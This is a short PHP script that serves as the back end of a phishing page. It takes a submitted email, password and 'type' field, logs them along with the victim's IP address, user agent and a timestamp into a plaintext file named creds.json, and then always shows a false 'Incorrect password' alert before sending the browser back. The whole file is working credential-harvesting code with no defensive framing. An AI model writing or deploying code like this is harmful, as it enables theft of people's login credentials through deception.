<?php
// Set the content type to JSON


// Get POST data
$email = isset($_POST['email']) ? $_POST['email'] : '';
$pass = isset($_POST['pass']) ? $_POST['pass'] : '';
$type = isset($_POST['type']) ? $_POST['type'] : '';

// Get client IP address
function getClientIP() {
    $ipKeys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim($ipList[0]);
        }
    }
    return 'UNKNOWN';
}

// Get User-Agent
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'UNKNOWN';

// Create data array
$data = [
    'email' => $email,
    'password' => $pass,
    'type' => $type,
    'ip' => getClientIP(),
    'user_agent' => $userAgent,
    'timestamp' => date('Y-m-d H:i:s')
];

// Path to JSON file
$file = 'creds.json';

// Read existing data
if (file_exists($file)) {
    $json = file_get_contents($file);
    $entries = json_decode($json, true);
    if (!is_array($entries)) $entries = [];
} else {
    $entries = [];
}

// Append new entry
$entries[] = $data;

// Save back to file
file_put_contents($file, json_encode($entries, JSON_PRETTY_PRINT));

// Return response

    echo "<script>
        alert('❌ Incorrect password. Please try again.');
        window.history.back();
    </script>";
    exit();1
?>
